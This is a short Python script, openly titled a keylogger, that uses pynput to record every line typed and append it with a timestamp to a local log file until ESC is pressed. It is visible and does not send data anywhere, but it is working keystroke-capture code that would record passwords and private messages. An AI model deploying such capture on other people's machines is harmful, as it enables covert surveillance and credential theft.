from pynput import keyboard
from datetime import datetime

LOG_FILE = "key_log.txt"
# Add a session header when the program starts
with open(LOG_FILE, "a") as f:
    f.write(f"\n=== Logging Started at {datetime.now()} ===\n")

buffer = []  # Temporary storage for typed keys

def format_key(key):
    """Format special keys for readability."""
    special_keys = {
        keyboard.Key.space: "[SPACE]",
        keyboard.Key.enter: "[ENTER]",
        keyboard.Key.tab: "[TAB]",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.shift_r: "[SHIFT_R]",
        keyboard.Key.shift: "[SHIFT]",
        keyboard.Key.ctrl_l: "[CTRL_L]",
        keyboard.Key.ctrl_r: "[CTRL_R]",
        keyboard.Key.alt_l: "[ALT_L]",
        keyboard.Key.alt_r: "[ALT_R]"
    }

    if key in special_keys:
        return special_keys[key]
    elif hasattr(key, 'char') and key.char is not None:
        return key.char  # Normal character
    else:
        return f"[{key}]"

def on_press(key):
    global buffer
    key_str = format_key(key)

    if key_str == "[ENTER]":
        # Save current buffer as a sentence
        text = "".join(buffer)
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.now()}] Typed: {text}\n")
        buffer = []  # Reset buffer
    elif key_str == "[BACKSPACE]":
        if buffer:
            buffer.pop()  # Remove last character
    elif key_str == "[SPACE]":
        buffer.append(" ")  # Add a real space
    elif len(key_str) == 1:  # Regular characters
        buffer.append(key_str)

def on_release(key):
    if key == keyboard.Key.esc:
        return False  # Stop when ESC is pressed

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

